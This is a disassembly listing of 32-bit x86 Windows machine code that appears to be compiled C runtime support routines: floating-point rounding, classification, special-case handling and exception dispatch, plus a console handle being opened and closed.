  40b235:	57                   	push   %edi
  40b236:	e8 2e bf ff ff       	call   0x407169
  40b23b:	59                   	pop    %ecx
  40b23c:	8b cf                	mov    %edi,%ecx
  40b23e:	83 e7 3f             	and    $0x3f,%edi
  40b241:	c1 f9 06             	sar    $0x6,%ecx
  40b244:	6b d7 30             	imul   $0x30,%edi,%edx
  40b247:	8b 0c 8d 90 4f 41 00 	mov    0x414f90(,%ecx,4),%ecx
  40b24e:	c6 44 11 28 00       	movb   $0x0,0x28(%ecx,%edx,1)
  40b253:	85 f6                	test   %esi,%esi
  40b255:	74 0c                	je     0x40b263
  40b257:	56                   	push   %esi
  40b258:	e8 66 a9 ff ff       	call   0x405bc3
  40b25d:	59                   	pop    %ecx
  40b25e:	83 c8 ff             	or     $0xffffffff,%eax
  40b261:	eb 02                	jmp    0x40b265
  40b263:	33 c0                	xor    %eax,%eax
  40b265:	5f                   	pop    %edi
  40b266:	5e                   	pop    %esi
  40b267:	5d                   	pop    %ebp
  40b268:	c3                   	ret
  40b269:	8b ff                	mov    %edi,%edi
  40b26b:	55                   	push   %ebp
  40b26c:	8b ec                	mov    %esp,%ebp
  40b26e:	8b 45 08             	mov    0x8(%ebp),%eax
  40b271:	33 c9                	xor    %ecx,%ecx
  40b273:	89 08                	mov    %ecx,(%eax)
  40b275:	8b 45 08             	mov    0x8(%ebp),%eax
  40b278:	89 48 04             	mov    %ecx,0x4(%eax)
  40b27b:	8b 45 08             	mov    0x8(%ebp),%eax
  40b27e:	89 48 08             	mov    %ecx,0x8(%eax)
  40b281:	8b 45 08             	mov    0x8(%ebp),%eax
  40b284:	83 48 10 ff          	orl    $0xffffffff,0x10(%eax)
  40b288:	8b 45 08             	mov    0x8(%ebp),%eax
  40b28b:	89 48 14             	mov    %ecx,0x14(%eax)
  40b28e:	8b 45 08             	mov    0x8(%ebp),%eax
  40b291:	89 48 18             	mov    %ecx,0x18(%eax)
  40b294:	8b 45 08             	mov    0x8(%ebp),%eax
  40b297:	89 48 1c             	mov    %ecx,0x1c(%eax)
  40b29a:	8b 45 08             	mov    0x8(%ebp),%eax
  40b29d:	83 c0 0c             	add    $0xc,%eax
  40b2a0:	87 08                	xchg   %ecx,(%eax)
  40b2a2:	5d                   	pop    %ebp
  40b2a3:	c3                   	ret
  40b2a4:	33 c0                	xor    %eax,%eax
  40b2a6:	50                   	push   %eax
  40b2a7:	50                   	push   %eax
  40b2a8:	6a 03                	push   $0x3
  40b2aa:	50                   	push   %eax
  40b2ab:	6a 03                	push   $0x3
  40b2ad:	68 00 00 00 40       	push   $0x40000000
  40b2b2:	68 58 13 41 00       	push   $0x411358
  40b2b7:	ff 15 b4 d0 40 00    	call   *0x40d0b4
  40b2bd:	a3 60 47 41 00       	mov    %eax,0x414760
  40b2c2:	c3                   	ret
  40b2c3:	a1 60 47 41 00       	mov    0x414760,%eax
  40b2c8:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b2cb:	74 0c                	je     0x40b2d9
  40b2cd:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40b2d0:	74 07                	je     0x40b2d9
  40b2d2:	50                   	push   %eax
  40b2d3:	ff 15 cc d0 40 00    	call   *0x40d0cc
  40b2d9:	c3                   	ret
  40b2da:	8b ff                	mov    %edi,%edi
  40b2dc:	55                   	push   %ebp
  40b2dd:	8b ec                	mov    %esp,%ebp
  40b2df:	51                   	push   %ecx
  40b2e0:	51                   	push   %ecx
  40b2e1:	dd 45 08             	fldl   0x8(%ebp)
  40b2e4:	51                   	push   %ecx
  40b2e5:	51                   	push   %ecx
  40b2e6:	dd 1c 24             	fstpl  (%esp)
  40b2e9:	e8 ca 0a 00 00       	call   0x40bdb8
  40b2ee:	59                   	pop    %ecx
  40b2ef:	59                   	pop    %ecx
  40b2f0:	a8 90                	test   $0x90,%al
  40b2f2:	75 4a                	jne    0x40b33e
  40b2f4:	dd 45 08             	fldl   0x8(%ebp)
  40b2f7:	51                   	push   %ecx
  40b2f8:	51                   	push   %ecx
  40b2f9:	dd 1c 24             	fstpl  (%esp)
  40b2fc:	e8 79 02 00 00       	call   0x40b57a
  40b301:	dd 45 08             	fldl   0x8(%ebp)
  40b304:	dd e1                	fucom  %st(1)
  40b306:	df e0                	fnstsw %ax
  40b308:	59                   	pop    %ecx
  40b309:	59                   	pop    %ecx
  40b30a:	dd d9                	fstp   %st(1)
  40b30c:	f6 c4 44             	test   $0x44,%ah
  40b30f:	7a 2b                	jp     0x40b33c
  40b311:	dc 0d 90 1b 41 00    	fmull  0x411b90
  40b317:	51                   	push   %ecx
  40b318:	51                   	push   %ecx
  40b319:	dd 55 f8             	fstl   -0x8(%ebp)
  40b31c:	dd 1c 24             	fstpl  (%esp)
  40b31f:	e8 56 02 00 00       	call   0x40b57a
  40b324:	dd 45 f8             	fldl   -0x8(%ebp)
  40b327:	da e9                	fucompp
  40b329:	df e0                	fnstsw %ax
  40b32b:	59                   	pop    %ecx
  40b32c:	59                   	pop    %ecx
  40b32d:	f6 c4 44             	test   $0x44,%ah
  40b330:	7a 05                	jp     0x40b337
  40b332:	6a 02                	push   $0x2
  40b334:	58                   	pop    %eax
  40b335:	eb 09                	jmp    0x40b340
  40b337:	33 c0                	xor    %eax,%eax
  40b339:	40                   	inc    %eax
  40b33a:	eb 04                	jmp    0x40b340
  40b33c:	dd d8                	fstp   %st(0)
  40b33e:	33 c0                	xor    %eax,%eax
  40b340:	8b e5                	mov    %ebp,%esp
  40b342:	5d                   	pop    %ebp
  40b343:	c3                   	ret
  40b344:	8b ff                	mov    %edi,%edi
  40b346:	55                   	push   %ebp
  40b347:	8b ec                	mov    %esp,%ebp
  40b349:	dd 45 08             	fldl   0x8(%ebp)
  40b34c:	b9 00 00 f0 7f       	mov    $0x7ff00000,%ecx
  40b351:	d9 e1                	fabs
  40b353:	b8 00 00 f0 ff       	mov    $0xfff00000,%eax
  40b358:	39 4d 14             	cmp    %ecx,0x14(%ebp)
  40b35b:	75 3b                	jne    0x40b398
  40b35d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40b361:	75 75                	jne    0x40b3d8
  40b363:	d9 e8                	fld1
  40b365:	d8 d1                	fcom   %st(1)
  40b367:	df e0                	fnstsw %ax
  40b369:	f6 c4 05             	test   $0x5,%ah
  40b36c:	7a 0f                	jp     0x40b37d
  40b36e:	dd d9                	fstp   %st(1)
  40b370:	dd d8                	fstp   %st(0)
  40b372:	dd 05 20 1d 41 00    	fldl   0x411d20
  40b378:	e9 e9 00 00 00       	jmp    0x40b466
  40b37d:	d8 d1                	fcom   %st(1)
  40b37f:	df e0                	fnstsw %ax
  40b381:	dd d9                	fstp   %st(1)
  40b383:	f6 c4 41             	test   $0x41,%ah
  40b386:	8b 45 18             	mov    0x18(%ebp),%eax
  40b389:	0f 85 da 00 00 00    	jne    0x40b469
  40b38f:	dd d8                	fstp   %st(0)
  40b391:	d9 ee                	fldz
  40b393:	e9 d1 00 00 00       	jmp    0x40b469
  40b398:	39 45 14             	cmp    %eax,0x14(%ebp)
  40b39b:	75 3b                	jne    0x40b3d8
  40b39d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40b3a1:	75 35                	jne    0x40b3d8
  40b3a3:	d9 e8                	fld1
  40b3a5:	d8 d1                	fcom   %st(1)
  40b3a7:	df e0                	fnstsw %ax
  40b3a9:	f6 c4 05             	test   $0x5,%ah
  40b3ac:	7a 0b                	jp     0x40b3b9
  40b3ae:	dd d9                	fstp   %st(1)
  40b3b0:	dd d8                	fstp   %st(0)
  40b3b2:	d9 ee                	fldz
  40b3b4:	e9 ad 00 00 00       	jmp    0x40b466
  40b3b9:	d8 d1                	fcom   %st(1)
  40b3bb:	df e0                	fnstsw %ax
  40b3bd:	dd d9                	fstp   %st(1)
  40b3bf:	f6 c4 41             	test   $0x41,%ah
  40b3c2:	8b 45 18             	mov    0x18(%ebp),%eax
  40b3c5:	0f 85 9e 00 00 00    	jne    0x40b469
  40b3cb:	dd d8                	fstp   %st(0)
  40b3cd:	dd 05 20 1d 41 00    	fldl   0x411d20
  40b3d3:	e9 91 00 00 00       	jmp    0x40b469
  40b3d8:	dd d8                	fstp   %st(0)
  40b3da:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40b3dd:	75 2e                	jne    0x40b40d
  40b3df:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b3e3:	0f 85 82 00 00 00    	jne    0x40b46b
  40b3e9:	d9 ee                	fldz
  40b3eb:	dd 45 10             	fldl   0x10(%ebp)
  40b3ee:	d8 d1                	fcom   %st(1)
  40b3f0:	df e0                	fnstsw %ax
  40b3f2:	f6 c4 41             	test   $0x41,%ah
  40b3f5:	0f 84 73 ff ff ff    	je     0x40b36e
  40b3fb:	d8 d9                	fcomp  %st(1)
  40b3fd:	df e0                	fnstsw %ax
  40b3ff:	f6 c4 05             	test   $0x5,%ah
  40b402:	8b 45 18             	mov    0x18(%ebp),%eax
  40b405:	7b 62                	jnp    0x40b469
  40b407:	dd d8                	fstp   %st(0)
  40b409:	d9 e8                	fld1
  40b40b:	eb 5c                	jmp    0x40b469
  40b40d:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40b410:	75 59                	jne    0x40b46b
  40b412:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b416:	75 53                	jne    0x40b46b
  40b418:	dd 45 10             	fldl   0x10(%ebp)
  40b41b:	51                   	push   %ecx
  40b41c:	51                   	push   %ecx
  40b41d:	dd 1c 24             	fstpl  (%esp)
  40b420:	e8 b5 fe ff ff       	call   0x40b2da
  40b425:	d9 ee                	fldz
  40b427:	dd 45 10             	fldl   0x10(%ebp)
  40b42a:	59                   	pop    %ecx
  40b42b:	59                   	pop    %ecx
  40b42c:	d8 d1                	fcom   %st(1)
  40b42e:	8b c8                	mov    %eax,%ecx
  40b430:	df e0                	fnstsw %ax
  40b432:	f6 c4 41             	test   $0x41,%ah
  40b435:	75 13                	jne    0x40b44a
  40b437:	dd d9                	fstp   %st(1)
  40b439:	dd d8                	fstp   %st(0)
  40b43b:	dd 05 20 1d 41 00    	fldl   0x411d20
  40b441:	83 f9 01             	cmp    $0x1,%ecx
  40b444:	75 20                	jne    0x40b466
  40b446:	d9 e0                	fchs
  40b448:	eb 1c                	jmp    0x40b466
  40b44a:	d8 d9                	fcomp  %st(1)
  40b44c:	df e0                	fnstsw %ax
  40b44e:	f6 c4 05             	test   $0x5,%ah
  40b451:	7a 0f                	jp     0x40b462
  40b453:	83 f9 01             	cmp    $0x1,%ecx
  40b456:	75 0e                	jne    0x40b466
  40b458:	dd d8                	fstp   %st(0)
  40b45a:	dd 05 30 1d 41 00    	fldl   0x411d30
  40b460:	eb 04                	jmp    0x40b466
  40b462:	dd d8                	fstp   %st(0)
  40b464:	d9 e8                	fld1
  40b466:	8b 45 18             	mov    0x18(%ebp),%eax
  40b469:	dd 18                	fstpl  (%eax)
  40b46b:	33 c0                	xor    %eax,%eax
  40b46d:	5d                   	pop    %ebp
  40b46e:	c3                   	ret
  40b46f:	8b ff                	mov    %edi,%edi
  40b471:	53                   	push   %ebx
  40b472:	8b dc                	mov    %esp,%ebx
  40b474:	51                   	push   %ecx
  40b475:	51                   	push   %ecx
  40b476:	83 e4 f0             	and    $0xfffffff0,%esp
  40b479:	83 c4 04             	add    $0x4,%esp
  40b47c:	55                   	push   %ebp
  40b47d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  40b480:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40b484:	8b ec                	mov    %esp,%ebp
  40b486:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40b48c:	a1 00 40 41 00       	mov    0x414000,%eax
  40b491:	33 c5                	xor    %ebp,%eax
  40b493:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b496:	8b 43 10             	mov    0x10(%ebx),%eax
  40b499:	56                   	push   %esi
  40b49a:	8b 73 0c             	mov    0xc(%ebx),%esi
  40b49d:	57                   	push   %edi
  40b49e:	0f b7 08             	movzwl (%eax),%ecx
  40b4a1:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  40b4a7:	8b 06                	mov    (%esi),%eax
  40b4a9:	83 e8 01             	sub    $0x1,%eax
  40b4ac:	74 29                	je     0x40b4d7
  40b4ae:	83 e8 01             	sub    $0x1,%eax
  40b4b1:	74 20                	je     0x40b4d3
  40b4b3:	83 e8 01             	sub    $0x1,%eax
  40b4b6:	74 17                	je     0x40b4cf
  40b4b8:	83 e8 01             	sub    $0x1,%eax
  40b4bb:	74 0e                	je     0x40b4cb
  40b4bd:	83 e8 01             	sub    $0x1,%eax
  40b4c0:	74 15                	je     0x40b4d7
  40b4c2:	83 e8 03             	sub    $0x3,%eax
  40b4c5:	75 72                	jne    0x40b539
  40b4c7:	6a 10                	push   $0x10
  40b4c9:	eb 0e                	jmp    0x40b4d9
  40b4cb:	6a 12                	push   $0x12
  40b4cd:	eb 0a                	jmp    0x40b4d9
  40b4cf:	6a 11                	push   $0x11
  40b4d1:	eb 06                	jmp    0x40b4d9
  40b4d3:	6a 04                	push   $0x4
  40b4d5:	eb 02                	jmp    0x40b4d9
  40b4d7:	6a 08                	push   $0x8
  40b4d9:	5f                   	pop    %edi
  40b4da:	51                   	push   %ecx
  40b4db:	8d 46 18             	lea    0x18(%esi),%eax
  40b4de:	50                   	push   %eax
  40b4df:	57                   	push   %edi
  40b4e0:	e8 ad 01 00 00       	call   0x40b692
  40b4e5:	83 c4 0c             	add    $0xc,%esp
  40b4e8:	85 c0                	test   %eax,%eax
  40b4ea:	75 47                	jne    0x40b533
  40b4ec:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40b4ef:	83 f9 10             	cmp    $0x10,%ecx
  40b4f2:	74 10                	je     0x40b504
  40b4f4:	83 f9 16             	cmp    $0x16,%ecx
  40b4f7:	74 0b                	je     0x40b504
  40b4f9:	83 f9 1d             	cmp    $0x1d,%ecx
  40b4fc:	74 06                	je     0x40b504
  40b4fe:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
  40b502:	eb 12                	jmp    0x40b516
  40b504:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40b507:	dd 46 10             	fldl   0x10(%esi)
  40b50a:	83 e0 e3             	and    $0xffffffe3,%eax
  40b50d:	83 c8 03             	or     $0x3,%eax
  40b510:	dd 5d b0             	fstpl  -0x50(%ebp)
  40b513:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40b516:	8d 46 18             	lea    0x18(%esi),%eax
  40b519:	50                   	push   %eax
  40b51a:	8d 46 08             	lea    0x8(%esi),%eax
  40b51d:	50                   	push   %eax
  40b51e:	51                   	push   %ecx
  40b51f:	57                   	push   %edi
  40b520:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40b526:	50                   	push   %eax
  40b527:	8d 45 80             	lea    -0x80(%ebp),%eax
  40b52a:	50                   	push   %eax
  40b52b:	e8 42 03 00 00       	call   0x40b872
  40b530:	83 c4 18             	add    $0x18,%esp
  40b533:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
  40b539:	68 ff ff 00 00       	push   $0xffff
  40b53e:	51                   	push   %ecx
  40b53f:	e8 d8 df ff ff       	call   0x40951c
  40b544:	83 3e 08             	cmpl   $0x8,(%esi)
  40b547:	59                   	pop    %ecx
  40b548:	59                   	pop    %ecx
  40b549:	74 14                	je     0x40b55f
  40b54b:	e8 78 8d ff ff       	call   0x4042c8
  40b550:	84 c0                	test   %al,%al
  40b552:	74 0b                	je     0x40b55f
  40b554:	56                   	push   %esi
  40b555:	e8 9b 8d ff ff       	call   0x4042f5
  40b55a:	59                   	pop    %ecx
  40b55b:	85 c0                	test   %eax,%eax
  40b55d:	75 08                	jne    0x40b567
  40b55f:	ff 36                	push   (%esi)
  40b561:	e8 20 06 00 00       	call   0x40bb86
  40b566:	59                   	pop    %ecx
  40b567:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b56a:	5f                   	pop    %edi
  40b56b:	33 cd                	xor    %ebp,%ecx
  40b56d:	5e                   	pop    %esi
  40b56e:	e8 eb 5c ff ff       	call   0x40125e
  40b573:	8b e5                	mov    %ebp,%esp
  40b575:	5d                   	pop    %ebp
  40b576:	8b e3                	mov    %ebx,%esp
  40b578:	5b                   	pop    %ebx
  40b579:	c3                   	ret
  40b57a:	8b ff                	mov    %edi,%edi
  40b57c:	55                   	push   %ebp
  40b57d:	8b ec                	mov    %esp,%ebp
  40b57f:	51                   	push   %ecx
  40b580:	51                   	push   %ecx
  40b581:	dd 45 08             	fldl   0x8(%ebp)
  40b584:	d9 fc                	frndint
  40b586:	dd 5d f8             	fstpl  -0x8(%ebp)
  40b589:	dd 45 f8             	fldl   -0x8(%ebp)
  40b58c:	8b e5                	mov    %ebp,%esp
  40b58e:	5d                   	pop    %ebp
  40b58f:	c3                   	ret
  40b590:	8b ff                	mov    %edi,%edi
  40b592:	55                   	push   %ebp
  40b593:	8b ec                	mov    %esp,%ebp
  40b595:	8b 45 08             	mov    0x8(%ebp),%eax
  40b598:	a8 20                	test   $0x20,%al
  40b59a:	74 04                	je     0x40b5a0
  40b59c:	6a 05                	push   $0x5
  40b59e:	eb 17                	jmp    0x40b5b7
  40b5a0:	a8 08                	test   $0x8,%al
  40b5a2:	74 05                	je     0x40b5a9
  40b5a4:	33 c0                	xor    %eax,%eax
  40b5a6:	40                   	inc    %eax
  40b5a7:	5d                   	pop    %ebp
  40b5a8:	c3                   	ret
  40b5a9:	a8 04                	test   $0x4,%al
  40b5ab:	74 04                	je     0x40b5b1
  40b5ad:	6a 02                	push   $0x2
  40b5af:	eb 06                	jmp    0x40b5b7
  40b5b1:	a8 01                	test   $0x1,%al
  40b5b3:	74 05                	je     0x40b5ba
  40b5b5:	6a 03                	push   $0x3
  40b5b7:	58                   	pop    %eax
  40b5b8:	5d                   	pop    %ebp
  40b5b9:	c3                   	ret
  40b5ba:	0f b6 c0             	movzbl %al,%eax
  40b5bd:	83 e0 02             	and    $0x2,%eax
  40b5c0:	03 c0                	add    %eax,%eax
  40b5c2:	5d                   	pop    %ebp
  40b5c3:	c3                   	ret
  40b5c4:	8b ff                	mov    %edi,%edi
  40b5c6:	53                   	push   %ebx
  40b5c7:	8b dc                	mov    %esp,%ebx
  40b5c9:	51                   	push   %ecx
  40b5ca:	51                   	push   %ecx
  40b5cb:	83 e4 f0             	and    $0xfffffff0,%esp
  40b5ce:	83 c4 04             	add    $0x4,%esp
  40b5d1:	55                   	push   %ebp
  40b5d2:	8b 6b 04             	mov    0x4(%ebx),%ebp
  40b5d5:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40b5d9:	8b ec                	mov    %esp,%ebp
  40b5db:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40b5e1:	a1 00 40 41 00       	mov    0x414000,%eax
  40b5e6:	33 c5                	xor    %ebp,%eax
  40b5e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b5eb:	56                   	push   %esi
  40b5ec:	8b 73 20             	mov    0x20(%ebx),%esi
  40b5ef:	8d 43 18             	lea    0x18(%ebx),%eax
  40b5f2:	57                   	push   %edi
  40b5f3:	56                   	push   %esi
  40b5f4:	50                   	push   %eax
  40b5f5:	ff 73 08             	push   0x8(%ebx)
  40b5f8:	e8 95 00 00 00       	call   0x40b692
  40b5fd:	83 c4 0c             	add    $0xc,%esp
  40b600:	85 c0                	test   %eax,%eax
  40b602:	75 26                	jne    0x40b62a
  40b604:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
  40b608:	50                   	push   %eax
  40b609:	8d 43 18             	lea    0x18(%ebx),%eax
  40b60c:	50                   	push   %eax
  40b60d:	8d 43 10             	lea    0x10(%ebx),%eax
  40b610:	50                   	push   %eax
  40b611:	ff 73 0c             	push   0xc(%ebx)
  40b614:	8d 43 20             	lea    0x20(%ebx),%eax
  40b617:	ff 73 08             	push   0x8(%ebx)
  40b61a:	50                   	push   %eax
  40b61b:	8d 45 80             	lea    -0x80(%ebp),%eax
  40b61e:	50                   	push   %eax
  40b61f:	e8 71 02 00 00       	call   0x40b895
  40b624:	8b 73 20             	mov    0x20(%ebx),%esi
  40b627:	83 c4 1c             	add    $0x1c,%esp
  40b62a:	ff 73 08             	push   0x8(%ebx)
  40b62d:	e8 5e ff ff ff       	call   0x40b590
  40b632:	59                   	pop    %ecx
  40b633:	8b f8                	mov    %eax,%edi
  40b635:	e8 8e 8c ff ff       	call   0x4042c8
  40b63a:	84 c0                	test   %al,%al
  40b63c:	74 29                	je     0x40b667
  40b63e:	85 ff                	test   %edi,%edi
  40b640:	74 25                	je     0x40b667
  40b642:	dd 43 18             	fldl   0x18(%ebx)
  40b645:	56                   	push   %esi
  40b646:	83 ec 18             	sub    $0x18,%esp
  40b649:	dd 5c 24 10          	fstpl  0x10(%esp)
  40b64d:	d9 ee                	fldz
  40b64f:	dd 5c 24 08          	fstpl  0x8(%esp)
  40b653:	dd 43 10             	fldl   0x10(%ebx)
  40b656:	dd 1c 24             	fstpl  (%esp)
  40b659:	ff 73 0c             	push   0xc(%ebx)
  40b65c:	57                   	push   %edi
  40b65d:	e8 53 05 00 00       	call   0x40bbb5
  40b662:	83 c4 24             	add    $0x24,%esp
  40b665:	eb 18                	jmp    0x40b67f
  40b667:	57                   	push   %edi
  40b668:	e8 19 05 00 00       	call   0x40bb86
  40b66d:	c7 04 24 ff ff 00 00 	movl   $0xffff,(%esp)
  40b674:	56                   	push   %esi
  40b675:	e8 a2 de ff ff       	call   0x40951c
  40b67a:	dd 43 18             	fldl   0x18(%ebx)
  40b67d:	59                   	pop    %ecx
  40b67e:	59                   	pop    %ecx
  40b67f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b682:	5f                   	pop    %edi
  40b683:	33 cd                	xor    %ebp,%ecx
  40b685:	5e                   	pop    %esi
  40b686:	e8 d3 5b ff ff       	call   0x40125e
  40b68b:	8b e5                	mov    %ebp,%esp
  40b68d:	5d                   	pop    %ebp
  40b68e:	8b e3                	mov    %ebx,%esp
  40b690:	5b                   	pop    %ebx
  40b691:	c3                   	ret
  40b692:	8b ff                	mov    %edi,%edi
  40b694:	55                   	push   %ebp
  40b695:	8b ec                	mov    %esp,%ebp
  40b697:	83 ec 10             	sub    $0x10,%esp
  40b69a:	53                   	push   %ebx
  40b69b:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40b69e:	56                   	push   %esi
  40b69f:	8b f3                	mov    %ebx,%esi
  40b6a1:	83 e6 1f             	and    $0x1f,%esi
  40b6a4:	f6 c3 08             	test   $0x8,%bl
  40b6a7:	74 16                	je     0x40b6bf
  40b6a9:	f6 45 10 01          	testb  $0x1,0x10(%ebp)
  40b6ad:	74 10                	je     0x40b6bf
  40b6af:	6a 01                	push   $0x1
  40b6b1:	e8 92 de ff ff       	call   0x409548
  40b6b6:	59                   	pop    %ecx
  40b6b7:	83 e6 f7             	and    $0xfffffff7,%esi
  40b6ba:	e9 90 01 00 00       	jmp    0x40b84f
  40b6bf:	8b c3                	mov    %ebx,%eax
  40b6c1:	23 45 10             	and    0x10(%ebp),%eax
  40b6c4:	a8 04                	test   $0x4,%al
  40b6c6:	74 10                	je     0x40b6d8
  40b6c8:	6a 04                	push   $0x4
  40b6ca:	e8 79 de ff ff       	call   0x409548
  40b6cf:	59                   	pop    %ecx
  40b6d0:	83 e6 fb             	and    $0xfffffffb,%esi
  40b6d3:	e9 77 01 00 00       	jmp    0x40b84f
  40b6d8:	f6 c3 01             	test   $0x1,%bl
  40b6db:	0f 84 9a 00 00 00    	je     0x40b77b
  40b6e1:	f6 45 10 08          	testb  $0x8,0x10(%ebp)
  40b6e5:	0f 84 90 00 00 00    	je     0x40b77b
  40b6eb:	6a 08                	push   $0x8
  40b6ed:	e8 56 de ff ff       	call   0x409548
  40b6f2:	8b 45 10             	mov    0x10(%ebp),%eax
  40b6f5:	59                   	pop    %ecx
  40b6f6:	b9 00 0c 00 00       	mov    $0xc00,%ecx
  40b6fb:	23 c1                	and    %ecx,%eax
  40b6fd:	74 54                	je     0x40b753
  40b6ff:	3d 00 04 00 00       	cmp    $0x400,%eax
  40b704:	74 37                	je     0x40b73d
  40b706:	3d 00 08 00 00       	cmp    $0x800,%eax
  40b70b:	74 1a                	je     0x40b727
  40b70d:	3b c1                	cmp    %ecx,%eax
  40b70f:	75 62                	jne    0x40b773
  40b711:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b714:	d9 ee                	fldz
  40b716:	dc 19                	fcompl (%ecx)
  40b718:	df e0                	fnstsw %ax
  40b71a:	dd 05 28 1d 41 00    	fldl   0x411d28
  40b720:	f6 c4 05             	test   $0x5,%ah
  40b723:	7b 4c                	jnp    0x40b771
  40b725:	eb 48                	jmp    0x40b76f
  40b727:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b72a:	d9 ee                	fldz
  40b72c:	dc 19                	fcompl (%ecx)
  40b72e:	df e0                	fnstsw %ax
  40b730:	f6 c4 05             	test   $0x5,%ah
  40b733:	7b 2c                	jnp    0x40b761
  40b735:	dd 05 28 1d 41 00    	fldl   0x411d28
  40b73b:	eb 32                	jmp    0x40b76f
  40b73d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b740:	d9 ee                	fldz
  40b742:	dc 19                	fcompl (%ecx)
  40b744:	df e0                	fnstsw %ax
  40b746:	f6 c4 05             	test   $0x5,%ah
  40b749:	7a 1e                	jp     0x40b769
  40b74b:	dd 05 28 1d 41 00    	fldl   0x411d28
  40b751:	eb 1e                	jmp    0x40b771
  40b753:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b756:	d9 ee                	fldz
  40b758:	dc 19                	fcompl (%ecx)
  40b75a:	df e0                	fnstsw %ax
  40b75c:	f6 c4 05             	test   $0x5,%ah
  40b75f:	7a 08                	jp     0x40b769
  40b761:	dd 05 20 1d 41 00    	fldl   0x411d20
  40b767:	eb 08                	jmp    0x40b771
  40b769:	dd 05 20 1d 41 00    	fldl   0x411d20
  40b76f:	d9 e0                	fchs
  40b771:	dd 19                	fstpl  (%ecx)
  40b773:	83 e6 fe             	and    $0xfffffffe,%esi
  40b776:	e9 d4 00 00 00       	jmp    0x40b84f
  40b77b:	f6 c3 02             	test   $0x2,%bl
  40b77e:	0f 84 cb 00 00 00    	je     0x40b84f
  40b784:	f6 45 10 10          	testb  $0x10,0x10(%ebp)
  40b788:	0f 84 c1 00 00 00    	je     0x40b84f
  40b78e:	57                   	push   %edi
  40b78f:	33 ff                	xor    %edi,%edi
  40b791:	f6 c3 10             	test   $0x10,%bl
  40b794:	74 01                	je     0x40b797
  40b796:	47                   	inc    %edi
  40b797:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b79a:	dd 01                	fldl   (%ecx)
  40b79c:	d9 ee                	fldz
  40b79e:	da e9                	fucompp
  40b7a0:	df e0                	fnstsw %ax
  40b7a2:	f6 c4 44             	test   $0x44,%ah
  40b7a5:	0f 8b 91 00 00 00    	jnp    0x40b83c
  40b7ab:	dd 01                	fldl   (%ecx)
  40b7ad:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40b7b0:	50                   	push   %eax
  40b7b1:	51                   	push   %ecx
  40b7b2:	51                   	push   %ecx
  40b7b3:	dd 1c 24             	fstpl  (%esp)
  40b7b6:	e8 9c 04 00 00       	call   0x40bc57
  40b7bb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b7be:	83 c4 0c             	add    $0xc,%esp
  40b7c1:	05 00 fa ff ff       	add    $0xfffffa00,%eax
  40b7c6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b7c9:	dd 55 f0             	fstl   -0x10(%ebp)
  40b7cc:	d9 ee                	fldz
  40b7ce:	3d ce fb ff ff       	cmp    $0xfffffbce,%eax
  40b7d3:	7d 07                	jge    0x40b7dc
  40b7d5:	33 ff                	xor    %edi,%edi
  40b7d7:	de c9                	fmulp  %st,%st(1)
  40b7d9:	47                   	inc    %edi
  40b7da:	eb 59                	jmp    0x40b835
  40b7dc:	de d9                	fcompp
  40b7de:	33 d2                	xor    %edx,%edx
  40b7e0:	df e0                	fnstsw %ax
  40b7e2:	f6 c4 41             	test   $0x41,%ah
  40b7e5:	75 01                	jne    0x40b7e8
  40b7e7:	42                   	inc    %edx
  40b7e8:	8b 45 f6             	mov    -0xa(%ebp),%eax
  40b7eb:	b9 03 fc ff ff       	mov    $0xfffffc03,%ecx
  40b7f0:	83 e0 0f             	and    $0xf,%eax
  40b7f3:	83 c8 10             	or     $0x10,%eax
  40b7f6:	66 89 45 f6          	mov    %ax,-0xa(%ebp)
  40b7fa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b7fd:	3b c1                	cmp    %ecx,%eax
  40b7ff:	7d 2b                	jge    0x40b82c
  40b801:	2b c8                	sub    %eax,%ecx
  40b803:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40b806:	f6 45 f0 01          	testb  $0x1,-0x10(%ebp)
  40b80a:	74 05                	je     0x40b811
  40b80c:	85 ff                	test   %edi,%edi
  40b80e:	75 01                	jne    0x40b811
  40b810:	47                   	inc    %edi
  40b811:	d1 e8                	shr    $1,%eax
  40b813:	f6 45 f4 01          	testb  $0x1,-0xc(%ebp)
  40b817:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40b81a:	74 08                	je     0x40b824
  40b81c:	0d 00 00 00 80       	or     $0x80000000,%eax
  40b821:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40b824:	d1 6d f4             	shrl   $1,-0xc(%ebp)
  40b827:	83 e9 01             	sub    $0x1,%ecx
  40b82a:	75 da                	jne    0x40b806
  40b82c:	dd 45 f0             	fldl   -0x10(%ebp)
